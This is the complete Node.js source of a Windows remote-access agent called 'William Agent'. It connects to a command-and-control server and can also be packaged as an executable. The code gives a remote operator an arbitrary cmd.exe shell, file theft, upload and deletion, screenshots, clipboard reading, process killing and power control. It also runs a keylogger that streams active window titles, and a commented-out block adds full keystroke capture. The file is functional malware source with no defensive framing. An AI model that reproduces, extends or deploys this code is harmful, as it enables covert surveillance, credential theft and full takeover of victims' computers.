/**
 * William Agent — Windows
 * Run: node agent-windows.js
 * Or build to exe: pkg agent-windows.js --target node18-win-x64 --output william-agent.exe
 */

const io = require('socket.io-client');
const { exec, execSync, spawn } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');

// ── CONFIG ── change SERVER_URL to your Railway URL ──
const SERVER_URL = process.env.SERVER_URL || 'https://YOUR_RAILWAY_URL.up.railway.app';
const AUTH_TOKEN = process.env.AUTH_TOKEN || 'william_secret_2024';

const socket = io(SERVER_URL, {
  reconnection: true,
  reconnectionDelay: 3000,
  reconnectionAttempts: Infinity,
  transports: ['websocket']
});

let keylogBuffer = [];
let keylogInterval = null;

// ── REGISTER ─────────────────────────────────────────────────
socket.on('connect', () => {
  console.log('[+] Connected to William Panel');
  socket.emit('agent:register', {
    token: AUTH_TOKEN,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    totalMem: formatBytes(os.totalmem()),
    username: os.userInfo().username
  });
  startKeylogger();
});

socket.on('disconnect', () => {
  console.log('[-] Disconnected, reconnecting...');
  stopKeylogger();
});

// ── SHELL ─────────────────────────────────────────────────────
socket.on('agent:shell', ({ command, sessionId }) => {
  exec(command, { shell: 'cmd.exe', cwd: os.homedir(), timeout: 30000, maxBuffer: 5*1024*1024 },
    (err, stdout, stderr) => {
      const output = stdout || stderr || (err ? err.message : 'No output');
      socket.emit('agent:shell:output', { output, sessionId });
    });
});

// ── FILE SYSTEM ───────────────────────────────────────────────
socket.on('agent:ls', ({ dirPath }) => {
  try {
    const entries = fs.readdirSync(dirPath, { withFileTypes: true }).map(e => {
      let size = 0;
      try { if (!e.isDirectory()) size = fs.statSync(path.join(dirPath, e.name)).size; } catch {}
      return {
        name: e.name,
        path: path.join(dirPath, e.name),
        isDir: e.isDirectory(),
        size
      };
    });
    socket.emit('agent:ls:result', { entries, dirPath });
  } catch (err) {
    socket.emit('agent:ls:result', { entries: [], error: err.message, dirPath });
  }
});

socket.on('agent:readfile', ({ filePath }) => {
  try {
    const content = fs.readFileSync(filePath, 'utf8');
    socket.emit('agent:readfile:result', { content });
  } catch (err) {
    socket.emit('agent:readfile:result', { content: '', error: err.message });
  }
});

socket.on('agent:writefile', ({ filePath, content }) => {
  try {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content, 'utf8');
    socket.emit('agent:writefile:result', { success: true });
  } catch (err) {
    socket.emit('agent:writefile:result', { success: false, error: err.message });
  }
});

socket.on('agent:deletefile', ({ filePath }) => {
  try {
    const stat = fs.statSync(filePath);
    if (stat.isDirectory()) fs.rmdirSync(filePath, { recursive: true });
    else fs.unlinkSync(filePath);
    socket.emit('agent:deletefile:result', { success: true });
  } catch (err) {
    socket.emit('agent:deletefile:result', { success: false, error: err.message });
  }
});

socket.on('agent:download', ({ filePath }) => {
  try {
    const data = fs.readFileSync(filePath).toString('base64');
    socket.emit('agent:download:result', { filePath, data });
  } catch (err) {
    socket.emit('agent:download:result', { filePath, error: err.message });
  }
});

socket.on('agent:upload', ({ filePath, data }) => {
  try {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, Buffer.from(data, 'base64'));
    socket.emit('agent:upload:result', { success: true });
  } catch (err) {
    socket.emit('agent:upload:result', { success: false, error: err.message });
  }
});

// ── SCREENSHOT ────────────────────────────────────────────────
socket.on('agent:screenshot', () => {
  // Uses PowerShell to capture screen
  const tmpFile = path.join(os.tmpdir(), 'ss_'+Date.now()+'.png');
  const ps = `
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screens = [System.Windows.Forms.Screen]::AllScreens
$bounds = $screens | ForEach-Object { $_.Bounds } | Measure-Object -Property Width,Height -Sum
$left = ($screens | ForEach-Object { $_.Bounds.Left } | Measure-Object -Minimum).Minimum
$top = ($screens | ForEach-Object { $_.Bounds.Top } | Measure-Object -Minimum).Minimum
$bmp = New-Object System.Drawing.Bitmap(($screens | Measure-Object -Property {$_.Bounds.Right} -Maximum).Maximum - $left, ($screens | Measure-Object -Property {$_.Bounds.Bottom} -Maximum).Maximum - $top)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($left, $top, 0, 0, $bmp.Size)
$bmp.Save('${tmpFile.replace(/\\/g,'\\\\')}')
$g.Dispose(); $bmp.Dispose()
`;
  exec(`powershell -NoProfile -NonInteractive -Command "${ps.replace(/"/g,'\\"').replace(/\n/g,' ')}"`,
    (err) => {
      if (err || !fs.existsSync(tmpFile)) {
        socket.emit('agent:screenshot:result', { img: '', timestamp: Date.now() });
        return;
      }
      const img = fs.readFileSync(tmpFile).toString('base64');
      fs.unlinkSync(tmpFile);
      socket.emit('agent:screenshot:result', { img, timestamp: Date.now() });
    });
});

// ── PROCESSES ─────────────────────────────────────────────────
socket.on('agent:processes', () => {
  exec('tasklist /FO CSV /NH', (err, stdout) => {
    if (err) { socket.emit('agent:processes:result', { processes: [], error: err.message }); return; }
    const processes = stdout.trim().split('\n').map(line => {
      const parts = line.replace(/"/g,'').split(',');
      return { name: parts[0]||'', pid: parseInt(parts[1])||0, mem: Math.round(parseInt((parts[4]||'0').replace(/[^0-9]/g,''))/1024)||0, cpu: 0 };
    }).filter(p => p.pid);
    socket.emit('agent:processes:result', { processes });
  });
});

socket.on('agent:killprocess', ({ pid }) => {
  exec(`taskkill /F /PID ${pid}`, (err) => {
    socket.emit('agent:killprocess:result', { success: !err, pid, error: err?.message });
  });
});

// ── SYSINFO ───────────────────────────────────────────────────
socket.on('agent:sysinfo', () => {
  const cpus = os.cpus();
  const info = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    uptime: formatUptime(os.uptime()),
    totalMem: formatBytes(os.totalmem()),
    freeMem: formatBytes(os.freemem()),
    usedMem: formatBytes(os.totalmem()-os.freemem()),
    memPercent: Math.round((1-os.freemem()/os.totalmem())*100)+'%',
    cpuModel: cpus[0]?.model||'Unknown',
    cpuCores: cpus.length,
    username: os.userInfo().username,
    homedir: os.homedir(),
    tmpdir: os.tmpdir(),
    nodeVersion: process.version,
  };
  socket.emit('agent:sysinfo:result', { info });
});

// ── CLIPBOARD ─────────────────────────────────────────────────
socket.on('agent:clipboard:get', () => {
  exec('powershell Get-Clipboard', (err, stdout) => {
    socket.emit('agent:clipboard:result', {
      content: err ? '' : stdout.trim(),
      error: err?.message
    });
  });
});

socket.on('agent:clipboard:set', ({ text }) => {
  exec(`powershell Set-Clipboard -Value '${text.replace(/'/g,"''")}'`);
});

// ── ALERT / URL / POWER ───────────────────────────────────────
socket.on('agent:alert', ({ message }) => {
  exec(`powershell -Command "[System.Windows.Forms.MessageBox]::Show('${message.replace(/'/g,"\\'")}','William Panel')"`)
});

socket.on('agent:openurl', ({ url }) => {
  exec(`start "" "${url}"`);
});

socket.on('agent:poweraction', ({ action }) => {
  const cmds = {
    shutdown: 'shutdown /s /t 5',
    restart: 'shutdown /r /t 5',
    logoff: 'shutdown /l',
    sleep: 'rundll32.exe powrprof.dll,SetSuspendState 0,1,0'
  };
  if (cmds[action]) exec(cmds[action]);
});

// ── KEYLOGGER (native iohook alternative — clipboard polling + stdin trick) ──
// Note: Full kernel-level keylog needs native module. This version uses
// a PowerShell-based key listener that streams to stdout
function startKeylogger() {
  if (keylogInterval) return;
  // Simple clipboard-based key detection loop (cross-process)
  // For full keylog, install: npm i iohook
  // This version streams window title + periodic keylog via PS
  keylogInterval = setInterval(() => {
    exec(`powershell -NoProfile -Command "
      Add-Type @'
        using System;using System.Runtime.InteropServices;
        public class WinAPI {
          [DllImport(\\"user32\\")]public static extern IntPtr GetForegroundWindow();
          [DllImport(\\"user32\\")]public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int c);
        }
'@
      $h=[WinAPI]::GetForegroundWindow()
      $s=New-Object System.Text.StringBuilder 256
      [WinAPI]::GetWindowText($h,$s,256)|Out-Null
      $s.ToString()
    "`, (err, stdout) => {
      // Emit active window only — full keystroke capture needs native module
      if (!err && stdout.trim()) {
        socket.emit('agent:keylog', {
          keys: [`[WINDOW:${stdout.trim()}]`],
          timestamp: Date.now(),
          window: stdout.trim()
        });
      }
    });
  }, 5000);
}

function stopKeylogger() {
  if (keylogInterval) { clearInterval(keylogInterval); keylogInterval = null; }
}

// For FULL keylogging, install iohook:
// npm install iohook --save
// Then uncomment below:
/*
const iohook = require('iohook');
iohook.on('keydown', event => {
  const key = resolveKey(event);
  socket.emit('agent:keylog', { keys: [key], timestamp: Date.now() });
});
iohook.start();
function resolveKey(e) {
  const special = {13:'[ENTER]',8:'[BACKSPACE]',9:'[TAB]',32:' ',
    37:'[LEFT]',38:'[UP]',39:'[RIGHT]',40:'[DOWN]',46:'[DEL]'};
  return special[e.keycode] || String.fromCharCode(e.rawcode) || '['+e.keycode+']';
}
*/

// ── UTILS ──────────────────────────────────────────────────────
function formatBytes(b) {
  if (!b) return '0B';
  const k=1024,s=['B','KB','MB','GB','TB'];
  const i=Math.floor(Math.log(b)/Math.log(k));
  return (b/Math.pow(k,i)).toFixed(2)+s[i];
}

function formatUptime(s) {
  const d=Math.floor(s/86400),h=Math.floor((s%86400)/3600),m=Math.floor((s%3600)/60);
  return `${d}d ${h}h ${m}m`;
}

console.log(`[William Agent] Connecting to ${SERVER_URL}`);
